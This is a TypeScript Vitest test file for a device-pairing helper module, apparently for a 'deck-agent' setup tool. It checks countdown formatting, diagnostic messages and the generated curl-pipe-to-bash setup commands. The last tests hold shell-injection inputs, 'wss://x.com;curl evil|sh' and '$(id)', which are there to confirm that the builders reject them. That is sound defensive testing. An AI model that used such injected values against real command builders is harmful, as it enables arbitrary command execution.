import { describe, it, expect } from 'vitest';
import { remainingMs, isExpired, fmtCountdown, diagnose, setupCommand, enrollCommand } from './pairing';

const NOW = 1_700_000_000_000;
const inMs = (ms: number) => new Date(NOW + ms).toISOString();

describe('remainingMs', () => {
  it('conta o que falta do prazo', () => {
    expect(remainingMs(inMs(90_000), NOW)).toBe(90_000);
  });

  it('nunca fica negativo', () => {
    expect(remainingMs(inMs(-5_000), NOW)).toBe(0);
  });

  it('sem prazo (relay antigo) não inventa contagem', () => {
    expect(remainingMs(null, NOW)).toBeNull();
    expect(remainingMs('lixo', NOW)).toBeNull();
  });
});

describe('isExpired', () => {
  it('só é expirado quando existe prazo E ele passou', () => {
    expect(isExpired(inMs(1), NOW)).toBe(false);
    expect(isExpired(inMs(0), NOW)).toBe(true);
    expect(isExpired(null, NOW)).toBe(false);
  });
});

describe('fmtCountdown', () => {
  it('formata em m:ss', () => {
    expect(fmtCountdown(600_000)).toBe('10:00');
    expect(fmtCountdown(65_000)).toBe('1:05');
    expect(fmtCountdown(0)).toBe('0:00');
  });
});

describe('diagnose', () => {
  const base = { probe: 'unknown' as const, agentOnline: false, expired: false, hasCode: true };

  it('agente online ganha de tudo', () => {
    expect(diagnose({ ...base, probe: 'unreachable', expired: true, agentOnline: true }).tone).toBe('green');
  });

  it('relay inalcançável aponta o navegador, não a VPS', () => {
    const d = diagnose({ ...base, probe: 'unreachable' });
    expect(d.tone).toBe('red');
    expect(d.title).toContain('não alcança o relay');
    expect(d.steps.length).toBeGreaterThan(0);
  });

  it('sessão recusada manda relogar em vez de caçar log na VPS', () => {
    expect(diagnose({ ...base, probe: 'rejected' })).toMatchObject({ tone: 'red', steps: [] });
  });

  it('código expirado explica o silêncio sem mandar caçar fantasma', () => {
    const d = diagnose({ ...base, expired: true });
    expect(d.title).toContain('expirou');
    expect(d.steps).toEqual([]);
  });

  it('relay ok e ninguém pareou entrega os comandos da VPS', () => {
    const d = diagnose({ ...base, probe: 'ok' });
    expect(d.tone).toBe('orange');
    expect(d.steps).toContain('systemctl status deck-agent --no-pager');
    expect(d.steps).toContain('journalctl -u deck-agent -n 50 --no-pager');
  });

  it('sem teste rodado ainda só espera', () => {
    expect(diagnose(base)).toMatchObject({ tone: 'neutral', steps: [] });
  });

  it('sem código ainda diz que está gerando', () => {
    expect(diagnose({ ...base, hasCode: false }).title).toContain('Gerando');
  });
});

describe('setupCommand', () => {
  it('isolated mode runs through sudo with DECK_ISOLATED=1', () => {
    expect(setupCommand('https://x/s.sh', 'ABC', false, 'isolated')).toBe('curl -fsSL https://x/s.sh | sudo DECK_ISOLATED=1 DECK_PAIR_CODE=ABC bash');
  });
  it('isolated mode keeps the admin role', () => {
    expect(setupCommand('https://x/s.sh', 'ABC', true, 'isolated')).toBe('curl -fsSL https://x/s.sh | sudo DECK_ISOLATED=1 DECK_AGENT_ROLE=admin DECK_PAIR_CODE=ABC bash');
  });
  it('pairs an admin account as admin', () => {
    expect(setupCommand('https://x/s.sh', 'ABC', true)).toBe('curl -fsSL https://x/s.sh | DECK_AGENT_ROLE=admin DECK_PAIR_CODE=ABC bash');
  });
  it('leaves any other account on the student default', () => {
    expect(setupCommand('https://x/s.sh', 'ABC', false)).toBe('curl -fsSL https://x/s.sh | DECK_PAIR_CODE=ABC bash');
  });
  it('passes the device code as an env var, never as an argument', () => {
    const dc = 'A'.repeat(52);
    expect(setupCommand('https://x/s.sh', 'ABC', false, 'isolated', '', dc)).toBe(`curl -fsSL https://x/s.sh | sudo DECK_ISOLATED=1 DECK_DEVICE_CODE=${dc} DECK_PAIR_CODE=ABC bash`);
    expect(setupCommand('https://x/s.sh', 'ABC', false, 'dedicated', '', dc)).toBe(`curl -fsSL https://x/s.sh | DECK_DEVICE_CODE=${dc} DECK_PAIR_CODE=ABC bash`);
  });
  it('builds the enroll command with the relay URL and refuses a shell-unsafe one', () => {
    expect(enrollCommand('wss://deck-relay.devfellowship.com')).toBe('cd ~/cockpit && DECK_RELAY_URL=wss://deck-relay.devfellowship.com npx tsx server/agent.ts --enroll-device');
    expect(enrollCommand('ws://100.1.2.3:7777')).toContain('DECK_RELAY_URL=ws://100.1.2.3:7777 ');
    expect(enrollCommand('wss://x.com;curl evil|sh')).toContain('DECK_RELAY_URL=wss://deck-relay.devfellowship.com ');
  });
  it('drops a device code that is not plain base32', () => {
    expect(setupCommand('https://x/s.sh', 'ABC', false, 'dedicated', '', '$(id)')).toBe('curl -fsSL https://x/s.sh | DECK_PAIR_CODE=ABC bash');
  });
});
